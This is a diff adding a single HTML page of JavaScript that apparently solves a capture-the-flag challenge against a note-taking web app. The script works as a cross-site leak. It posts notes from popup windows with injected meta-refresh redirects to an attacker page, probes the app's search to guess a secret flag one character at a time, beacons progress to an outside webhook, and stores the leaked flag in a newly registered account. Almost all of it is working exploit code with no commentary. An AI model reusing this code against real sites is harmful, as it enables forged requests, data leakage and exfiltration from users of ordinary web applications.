@@ -1,0 +1,187 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>loading</title>
+<pre id="log">loading</pre>
+<script>
+const TARGET = "https://challctf.find-it.id:8023";
+const ATTACKER = "https://2byte36.github.io/test";
+const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+const LEAK_USER = "finditleakgh20260503";
+const LEAK_PASS = "finditleakgh20260503_pass";
+const WEBHOOK = "https://webhook.site/cbab52bd-a7cf-4960-8ec7-9a05fd38e058";
+
+let prefix = "FINDIT{";
+let round = 0;
+let currentHit = null;
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+const logEl = document.getElementById("log");
+
+function log(msg) {
+  logEl.textContent += "\n" + msg;
+}
+
+function beacon(step, info) {
+  try {
+    const img = new Image();
+    img.src = WEBHOOK + "?step=" + encodeURIComponent(step) +
+      "&info=" + encodeURIComponent(info || "") +
+      "&t=" + Date.now();
+  } catch (_) {}
+}
+
+beacon("loaded", navigator.userAgent);
+
+window.addEventListener("error", (event) => {
+  beacon("error", event.message + " @" + event.filename + ":" + event.lineno);
+});
+
+function htmlEscape(s) {
+  return s
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;")
+    .replaceAll('"', "&quot;");
+}
+
+function popupPost(name, path, fields) {
+  const w = open("", name);
+  if (!w) {
+    return null;
+  }
+
+  const inputs = Object.entries(fields).map(([key, value]) => {
+    return `<textarea name="${htmlEscape(key)}">${htmlEscape(value)}</textarea>`;
+  }).join("");
+
+  w.document.write(
+    `<!doctype html><meta charset="utf-8">` +
+    `<form id="f" method="POST" action="${TARGET}${path}">${inputs}</form>` +
+    `<script>document.getElementById("f").submit()<\/script>`
+  );
+  return w;
+}
+
+function closeQuietly(w) {
+  try {
+    if (w) {
+      w.close();
+    }
+  } catch (_) {}
+}
+
+function receiveHit(data) {
+  if (!data || String(data.round) !== String(round) || currentHit) {
+    return;
+  }
+  currentHit = data;
+  log("hit " + data.q);
+  beacon("hit", data.q);
+}
+
+try {
+  const channel = new BroadcastChannel("findit-hit-channel");
+  channel.onmessage = (event) => receiveHit(event.data);
+} catch (_) {}
+
+window.addEventListener("storage", (event) => {
+  if (event.key === "findit-hit" && event.newValue) {
+    try {
+      receiveHit(JSON.parse(event.newValue));
+    } catch (_) {}
+  }
+});
+
+async function waitForHit() {
+  for (let i = 0; i < 100; i++) {
+    if (currentHit) {
+      return currentHit;
+    }
+    try {
+      const data = JSON.parse(localStorage.getItem("findit-hit") || "null");
+      receiveHit(data);
+    } catch (_) {}
+    await sleep(150);
+  }
+  return null;
+}
+
+async function runRound() {
+  round += 1;
+  currentHit = null;
+  localStorage.removeItem("findit-hit");
+  log("round " + round + " prefix=" + prefix);
+
+  const candidates = [...ALPHABET].map((ch, idx) => ({ ch, idx, q: prefix + ch }));
+  const opened = [];
+
+  opened.push(popupPost("z_" + round, "/create-note", {
+    content: "Z " + candidates.map((c) => c.q).join(" ")
+  }));
+  await sleep(100);
+
+  for (const c of candidates) {
+    const hit = `${ATTACKER}/hit.html?round=${round}&ch=${encodeURIComponent(c.ch)}&q=${encodeURIComponent(c.q)}`;
+    const content =
+      `G ${c.q} <!--managed-->` +
+      `<meta name="referrer" content="unsafe-url">` +
+      `<meta http-equiv="refresh" content="0;url=${hit}">`;
+    opened.push(popupPost("g_" + round + "_" + c.idx, "/create-note", { content }));
+    await sleep(5);
+  }
+
+  await sleep(450);
+
+  for (const c of candidates) {
+    opened.push(open(`${TARGET}/search-notes?query=view:${encodeURIComponent(c.q)}`, "s_" + round + "_" + c.idx));
+    await sleep(5);
+  }
+
+  const hit = await waitForHit();
+  opened.forEach(closeQuietly);
+
+  if (!hit) {
+    log("no hit after " + prefix);
+    beacon("nohit", prefix + " round=" + round);
+    await storeNote("FAIL no hit after " + prefix + " round=" + round);
+    return;
+  }
+
+  prefix += hit.ch;
+  if (hit.ch === "}") {
+    await storeNote("LEAK " + prefix);
+    return;
+  }
+
+  await sleep(100);
+  runRound();
+}
+
+async function storeNote(content) {
+  log("store=" + content);
+  beacon("store", content);
+  popupPost("final_register", "/register", {
+    username: LEAK_USER,
+    password: LEAK_PASS
+  });
+  await sleep(800);
+
+  popupPost("final_login", "/login", {
+    username: LEAK_USER,
+    password: LEAK_PASS
+  });
+  await sleep(1200);
+
+  popupPost("final_note_1", "/create-note", {
+    content
+  });
+  await sleep(800);
+
+  popupPost("final_note_2", "/create-note", {
+    content
+  });
+  log("stored in " + LEAK_USER);
+}
+
+setTimeout(runRound, 500);
+</script>
